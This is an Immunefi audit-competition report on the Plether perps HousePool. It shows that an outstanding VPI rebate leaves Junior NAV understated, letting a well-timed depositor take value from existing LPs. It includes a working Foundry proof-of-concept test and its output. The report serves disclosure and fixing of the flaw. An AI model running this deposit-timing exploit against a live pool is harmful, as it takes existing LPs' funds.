# \#99573 [SC-Critical] Reserve-backed opening VPI rebate is booked as a final Junior NAV loss, so an LP depositing while it is outstanding takes the clawback from existing LPs

**Submitted on Nov 14th 2026 at 09:51:57 UTC by @Valisthea for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99573
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief

When a skew-reducing open receives a negative VPI (a rebate), the pool pays the rebate out of its cash at the open (`CfdEngineSettlementSidecar.sol:443`, `IHousePool.payOut`). The same amount is then locked in the trader's VPI rebate reserve, a non-withdrawable bucket that exists only to repay it (`INTERNAL_ARCHITECTURE_MAP.md:57`: "reserved for the matching clawback"; `ACCOUNTING_SPEC.md:798`, `vpiRebateReserveAssets = max(-vpiAccrued, 0)`). At close, the lifetime clamp (`CloseAccountingLib.sol:111-117`) forces the full repayment whatever the depth is then, and the reserve funds it.

The pool's NAV does not carry that guaranteed repayment as a receivable. Junior NAV drops by the rebate at the open and only recovers when the position closes. Every deposit that settles while the position is open is priced on an understated NAV. When the reserve-backed clawback returns, the depositor's newly minted shares take a pro-rata part of it from the LPs who were there before.

## Vulnerability details

1. The pool pays the rebate out of cash at the open. Pool assets, and therefore Junior NAV, fall by that amount.
2. The trader's account must fund a VPI rebate reserve equal to the rebate before the open can execute. The reserve cannot be withdrawn and cannot back price losses (WHITEPAPER.md section 5.1). Its only use is the clawback.
3. At close, `CloseAccountingLib.sol:111-117` clamps the lifetime VPI at zero, so the rebate is repaid in full from the reserve. The NatSpec says the clamp prevents a TRADER from extracting a net rebate. It does not address LP pricing in between.
4. The NAV used for LP entry and exit (pool cash minus trader claims plus marked position PnL, `HousePoolAccountingLib.sol:60-78`) has no term for that reserve-backed receivable.

At constant depth, the rebate equals the charges the pool already holds for the same skew, so NAV stays fair. If depth fell between the skew-creating open and the reducing open, for example because an LP redeemed or the pool paid winning traders, the rebate is computed on the smaller depth and exceeds the charges held. NAV is then understated by the difference until the reducer closes.

SECURITY.md:859 states the design goal that "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV". Here the reverse happens: a new LP buys in below fair value and is paid out of a receivable the existing LPs already own.

## Impact

Direct theft of existing LP funds by any depositor, with no trading and no special role. The PoC deposits 1,000,000 USDG into the Junior tranche while one rebate is outstanding, then redeems after the close: +918.32 USDG. The existing LP ends 920.33 USDG lower than in the control. The mark never moves. The same 1,000,000 USDG deposit made after the positions close gains nothing (-0.01 USDG).

The state is created by ordinary activity (an LP exit or trader payouts between two opposite opens) and is public on-chain, so any LP can watch for it. The gain scales with the size of the rebate and with the depositor's share of the post-deposit tranche.

## Not a known issue

- Cecuro: no finding on the VPI rebate reserve and LP NAV. LOW-30 only concerns invalid-preview diagnostics.
- SECURITY.md "VPI limitations": lifetime clamp, liquidation, zero depth, frozen spread, partial-close approximation. Nothing on NAV or LP pricing.
- AI scan, "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" (info): concerns the size of a CLOSE rebate paid to a trader. This report concerns the pool's valuation of an OPEN rebate that is fully repaid, and the transfer between LPs it causes.
- It is not the refundable-charge case (a charge counted as NAV, inflating it for exiting LPs). Here a guaranteed receivable is omitted, deflating NAV for entering LPs. The fix is different: recognise the reserve-backed clawback in NAV.

## Suggested fix

Count the reserve-backed VPI clawback as a NAV receivable while it is outstanding, as collectible terminal receivables already are. Alternatively, keep the rebate in the pool as an encumbered balance until the clawback.

## Proof of Concept

## Steps

Release risk parameters (DEPLOYMENT.md): vpiFactor 0.01e18, maxSkewRatio 0.4e18, maintenance 10 bps, initial 20 bps, carry 500 bps. Real BasePerpTest deployment. The mark is constant at 1.00 throughout. Deposits and redemptions go through the production queues (cooldown, epochs, `settleLpEpoch`, claims).

1. VICTIM and LEAVER each deposit 1,000,000 USDG in the Junior tranche.
2. MAKER opens LONG 780,000 (39% of depth). The pool holds its VPI charge.
3. LEAVER, an honest LP, fully redeems. Depth roughly halves.
4. REDUCER opens SHORT 780,000, bringing skew to zero. Its rebate is computed on the smaller depth: 3,033.63 USDG of pool cash leave, and the same amount is locked in REDUCER's VPI rebate reserve.
5. Attack: ATTACKER deposits 1,000,000 USDG now. Control: ATTACKER deposits only after step 7.
6. REDUCER closes. The clamp forces full repayment of the rebate from its reserve, and NAV rises.
7. MAKER closes.
8. ATTACKER redeems everything. Compare with its deposit, and VICTIM's share value with its deposit.

Result:

```
[PASS] test_Control_SameDepositAfterPositionsClose()
  pool cash paid out at the reducer open (rebate net of fee): 3033626798
  junior NAV in the window: 998726465730
  attacker net (USDG atoms): -9132
  victim net   (USDG atoms): -434695753
[PASS] test_DepositInRebateWindowTakesValueFromExistingLp()
  pool cash paid out at the reducer open (rebate net of fee): 3033626798
  junior NAV in the window: 998726465730
  attacker net (USDG atoms): 918323912
  victim net   (USDG atoms): -1355024867
Suite result: ok. 2 passed; 0 failed
```

The attacker gains +918.32 USDG only when it deposits in the window. The victim loses 920.33 USDG more than in the control; the remaining 434.70 USDG it loses in both runs comes from LEAVER's step-3 exit, which is outside this report.

Run from the repository root at a82d4fef:

```
forge test --root packages/perps --match-path 'test/perps/accounting/close/VpiRebateDeflatedNavPoC.t.sol' -vv
```

File `packages/perps/test/perps/accounting/close/VpiRebateDeflatedNavPoC.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract VpiRebateDeflatedNavPoC is BasePerpTest {

    address private constant VICTIM = address(0xBEEF);
    address private constant LEAVER = address(0x1EAF);
    address private constant ATTACKER = address(0xA11CE);
    address private constant MAKER = address(0x3A4E);
    address private constant REDUCER = address(0x5ED0);

    uint256 private constant MARK = 1e8;
    uint256 private constant LP_EACH = 1_000_000e6;
    uint256 private constant SIZE = 780_000e18;
    uint256 private constant MAKER_MARGIN = 50_000e6;
    uint256 private constant REDUCER_MARGIN = 100_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _refreshMark() private {
        vm.warp(block.timestamp + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, SafeCast.toUint64(block.timestamp));
    }

    function _shareValue(address holder) private view returns (uint256) {
        uint256 shares = juniorVault.balanceOf(holder);
        return shares == 0 ? 0 : juniorVault.convertToAssets(shares);
    }

    function _exitJuniorFully(address lp) private returns (uint256 assetsOut) {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark();
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) vm.warp(maturity + 1);
        _refreshMark();
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        assertGt(claimable, 0, "the redemption must be funded");
        vm.prank(lp);
        assetsOut = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _depositJunior(address lp, uint256 amount) private {
        settlementToken.mint(lp, amount);
        _refreshMark();
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 activationTime = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) vm.warp(activationTime);
        _refreshMark();
        _settleLpEpochForTest();
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "deposit finalized at the requested basis");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _closeAll(address account) private {
        _refreshMark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(account);
        if (size != 0) _close(account, side, size, MARK, pool.totalAssets());
    }

    function _toWindow() private returns (uint256 rebatePaid) {
        _refreshMark();
        _fundJunior(VICTIM, LP_EACH);
        _fundJunior(LEAVER, LP_EACH);
        _fundTrader(MAKER, MAKER_MARGIN * 4);
        _fundTrader(REDUCER, REDUCER_MARGIN * 4);
        _refreshMark();
        _open(MAKER, CfdTypes.Side.LONG, SIZE, MAKER_MARGIN, MARK, pool.totalAssets());
        _exitJuniorFully(LEAVER);
        _refreshMark();
        uint256 depthBefore = pool.totalAssets();
        _open(REDUCER, CfdTypes.Side.SHORT, SIZE, REDUCER_MARGIN, MARK, pool.totalAssets());
        rebatePaid = depthBefore - pool.totalAssets();
        emit log_named_uint("pool cash paid out at the reducer open (rebate net of fee)", rebatePaid);
        emit log_named_uint("junior NAV in the window", juniorVault.totalAssets());
    }

    function _finish(bool attackerInWindow) private returns (int256 attackerNet, int256 victimNet) {
        if (attackerInWindow) _depositJunior(ATTACKER, LP_EACH);
        _closeAll(REDUCER);
        _closeAll(MAKER);
        if (!attackerInWindow) _depositJunior(ATTACKER, LP_EACH);
        uint256 out = _exitJuniorFully(ATTACKER);
        attackerNet = int256(out) - int256(LP_EACH);
        victimNet = int256(_shareValue(VICTIM)) - int256(LP_EACH);
        (uint256 m,,,,,,) = engine.positions(MAKER);
        (uint256 r,,,,,,) = engine.positions(REDUCER);
        assertEq(m + r, 0, "both positions closed");
        assertEq(engine.lastMarkPrice(), MARK, "mark unchanged end to end");
        emit log_named_int("attacker net (USDG atoms)", attackerNet);
        emit log_named_int("victim net   (USDG atoms)", victimNet);
    }

    function test_DepositInRebateWindowTakesValueFromExistingLp() public {
        _toWindow();
        (int256 attackerNet,) = _finish(true);
        assertGt(attackerNet, 100e6, "attacker gains more than 100 USDG by depositing in the window");
    }

    function test_Control_SameDepositAfterPositionsClose() public {
        _toWindow();
        (int256 attackerNet,) = _finish(false);
        assertLe(attackerNet, 1e6, "control: no gain outside the window");
    }

}
```
